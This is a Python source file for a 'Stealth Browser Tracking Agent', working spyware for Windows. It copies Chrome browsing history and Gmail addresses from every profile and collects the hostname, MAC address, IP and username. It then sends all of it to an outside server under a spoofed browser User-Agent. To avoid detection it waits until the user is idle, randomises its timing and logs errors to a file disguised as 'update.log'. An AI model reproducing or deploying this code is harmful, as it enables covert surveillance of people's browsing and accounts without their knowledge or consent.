"""
Stealth Browser Tracking Agent
Designed for silent background operation with minimal detection
"""

import os
import sys
import json
import time
import random
import threading
import requests
import sqlite3
import shutil
import tempfile
import subprocess
from datetime import datetime, timezone
import socket
import getpass
import platform
from uuid import getnode
import psutil

class StealthAgent:
    def __init__(self):
        self.config = self.load_config()
        self.client_id = None
        self.running = False
        self.last_collection = None
        
        # Stealth settings
        self.process_priority = psutil.BELOW_NORMAL_PRIORITY_CLASS
        self.max_cpu_percent = 2.0  # Max 2% CPU usage
        self.collection_delay = random.randint(1, 5)  # Random delay
        
        # Set low process priority
        try:
            p = psutil.Process()
            p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        except:
            pass
    
    def load_config(self):
        """Load configuration with fallback"""
        try:
            config_path = os.path.join(os.path.dirname(__file__), 'config.json')
            with open(config_path, 'r') as f:
                return json.load(f)
        except:
            return {
                "server_url": "https://browser-tracking.vercel.app",
                "api_token": "BrowserTracker2024SecureToken",
                "check_interval": 300,
                "stealth_mode": True
            }
    
    def is_user_active(self):
        """Check if user is actively using the computer"""
        try:
            # Check if screensaver is active or system is idle
            import ctypes
            from ctypes import wintypes
            
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [('cbSize', wintypes.UINT), ('dwTime', wintypes.DWORD)]
            
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
            
            millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
            idle_time = millis / 1000.0  # Convert to seconds
            
            # Consider user inactive if idle for more than 5 minutes
            return idle_time < 300
        except:
            return False
    
    def wait_for_optimal_time(self):
        """Wait for optimal collection time"""
        if not self.config.get('stealth_mode', False):
            return
        
        # Wait if user is active
        while self.is_user_active():
            time.sleep(30)  # Check every 30 seconds
        
        # Add random delay to avoid pattern detection
        delay = random.randint(10, 60)
        time.sleep(delay)
    
    def get_system_info(self):
        """Collect system information"""
        try:
            # Get MAC address
            mac = getnode()
            mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            return {
                'hostname': socket.gethostname(),
                'mac_address': mac_address,
                'local_ip': local_ip,
                'username': getpass.getuser(),
                'os_info': {
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine()
                }
            }
        except Exception as e:
            self.log_error(f"Error getting system info: {e}")
            return None
    
    def get_chrome_profiles(self):
        """Get Chrome profile information"""
        try:
            chrome_base = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
            if not os.path.exists(chrome_base):
                return []
            
            profiles = []
            
            # Check Default profile
            default_path = os.path.join(chrome_base, 'Default')
            if os.path.exists(default_path):
                gmail = self.extract_gmail_account(default_path)
                profiles.append({
                    'name': 'Default',
                    'path': default_path,
                    'gmail_accounts': gmail,
                    'is_active': True
                })
            
            # Check numbered profiles
            for item in os.listdir(chrome_base):
                if item.startswith('Profile '):
                    profile_path = os.path.join(chrome_base, item)
                    if os.path.isdir(profile_path):
                        gmail = self.extract_gmail_account(profile_path)
                        profiles.append({
                            'name': item,
                            'path': profile_path,
                            'gmail_accounts': gmail,
                            'is_active': False
                        })
            
            return profiles
        except Exception as e:
            self.log_error(f"Error getting Chrome profiles: {e}")
            return []
    
    def extract_gmail_account(self, profile_path):
        """Extract Gmail account from Chrome profile"""
        try:
            prefs_file = os.path.join(profile_path, 'Preferences')
            if not os.path.exists(prefs_file):
                return []
            
            with open(prefs_file, 'r', encoding='utf-8') as f:
                prefs = json.load(f)
            
            gmail_accounts = []
            
            # Check account_info
            account_info = prefs.get('account_info', [])
            for account in account_info:
                email = account.get('email', '')
                if '@gmail.com' in email.lower():
                    gmail_accounts.append(email)
            
            # Check signin info
            signin = prefs.get('signin', {})
            allowed_usernames = signin.get('allowed_usernames', [])
            for username in allowed_usernames:
                if '@gmail.com' in username.lower():
                    gmail_accounts.append(username)
            
            return list(set(gmail_accounts))  # Remove duplicates
            
        except Exception as e:
            self.log_error(f"Error extracting Gmail: {e}")
            return []
    
    def get_chrome_history(self, limit=50):
        """Collect Chrome browsing history"""
        try:
            profiles = self.get_chrome_profiles()
            all_history = []
            
            for profile in profiles:
                history_db = os.path.join(profile['path'], 'History')
                if not os.path.exists(history_db):
                    continue
                
                try:
                    # Copy database to avoid locking issues
                    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                        temp_db = temp_file.name
                    
                    shutil.copy2(history_db, temp_db)
                    
                    # Read history
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    # Get recent history (last 24 hours)
                    cursor.execute('''
                        SELECT url, title, visit_count, last_visit_time
                        FROM urls
                        WHERE last_visit_time > 0
                        AND last_visit_time > (strftime('%s', 'now') - 86400) * 1000000 + 11644473600000000
                        ORDER BY last_visit_time DESC
                        LIMIT ?
                    ''', (limit,))
                    
                    for row in cursor.fetchall():
                        url, title, visit_count, chrome_time = row
                        
                        # Skip internal URLs
                        if self.should_skip_url(url):
                            continue
                        
                        # Convert Chrome timestamp
                        if chrome_time > 0:
                            unix_timestamp = (chrome_time - 11644473600000000) / 1000000
                            visit_time = datetime.fromtimestamp(unix_timestamp, tz=timezone.utc)
                        else:
                            visit_time = datetime.now(tz=timezone.utc)
                        
                        gmail_account = profile['gmail_accounts'][0] if profile['gmail_accounts'] else None
                        
                        all_history.append({
                            'url': url[:2000],  # Truncate long URLs
                            'title': (title or '')[:500],  # Truncate long titles
                            'visit_time': visit_time.isoformat(),
                            'browser_type': 'Chrome',
                            'profile_name': profile['name'],
                            'gmail_account': gmail_account
                        })
                    
                    conn.close()
                    os.unlink(temp_db)
                    
                except Exception as e:
                    self.log_error(f"Error reading history from {profile['name']}: {e}")
                    continue
            
            return all_history[:limit]  # Return limited results
            
        except Exception as e:
            self.log_error(f"Error getting Chrome history: {e}")
            return []
    
    def should_skip_url(self, url):
        """Check if URL should be skipped"""
        skip_patterns = [
            'chrome://', 'chrome-extension://', 'edge://', 'about:',
            'file://', 'localhost', '127.0.0.1', '192.168.', '10.0.', '172.16.'
        ]
        
        url_lower = url.lower()
        return any(pattern in url_lower for pattern in skip_patterns)
    
    def send_data(self, endpoint, data):
        """Send data to server with stealth measures"""
        try:
            headers = {
                'Authorization': f'Bearer {self.config["api_token"]}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            url = f'{self.config["server_url"]}/api/{endpoint}'
            
            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=30,
                verify=True
            )
            
            return response.status_code == 200, response
            
        except Exception as e:
            self.log_error(f"Error sending data to {endpoint}: {e}")
            return False, None
    
    def register_client(self):
        """Register client with server"""
        try:
            system_info = self.get_system_info()
            if not system_info:
                return False
            
            success, response = self.send_data('register', system_info)
            if success and response:
                data = response.json()
                if data.get('success'):
                    self.client_id = data.get('client_id')
                    return True
            
            return False
            
        except Exception as e:
            self.log_error(f"Error registering client: {e}")
            return False
    
    def collect_and_send_data(self):
        """Main data collection and transmission"""
        try:
            # Wait for optimal time if in stealth mode
            self.wait_for_optimal_time()
            
            # Ensure client is registered
            if not self.client_id:
                if not self.register_client():
                    return False
            
            # Collect browsing history
            history = self.get_chrome_history(50)
            if not history:
                return True  # No data to send, but not an error
            
            # Send browsing data
            success, response = self.send_data('browsing-data', {
                'client_id': self.client_id,
                'browsing_data': history
            })
            
            if success:
                self.last_collection = datetime.now()
                return True
            
            return False
            
        except Exception as e:
            self.log_error(f"Error in collect_and_send_data: {e}")
            return False
    
    def run_stealth_loop(self):
        """Main stealth operation loop"""
        self.running = True
        
        while self.running:
            try:
                # Collect and send data
                self.collect_and_send_data()
                
                # Calculate next collection time with randomization
                base_interval = self.config.get('check_interval', 300)
                random_offset = random.randint(-30, 30)  # ±30 seconds
                sleep_time = base_interval + random_offset
                
                # Sleep in small chunks to allow for graceful shutdown
                for _ in range(sleep_time):
                    if not self.running:
                        break
                    time.sleep(1)
                    
            except Exception as e:
                self.log_error(f"Error in main loop: {e}")
                time.sleep(60)  # Wait before retrying
    
    def log_error(self, message):
        """Log errors silently"""
        try:
            log_file = os.path.join(os.path.dirname(__file__), 'update.log')
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"{timestamp} - {message}\n")
        except:
            pass  # Fail silently
    
    def stop(self):
        """Stop the agent"""
        self.running = False

def main():
    """Main entry point"""
    try:
        agent = StealthAgent()
        agent.run_stealth_loop()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        # Log error and exit silently
        try:
            with open('update.log', 'a') as f:
                f.write(f"{datetime.now()} - Fatal error: {e}\n")
        except:
            pass

if __name__ == '__main__':
    main()
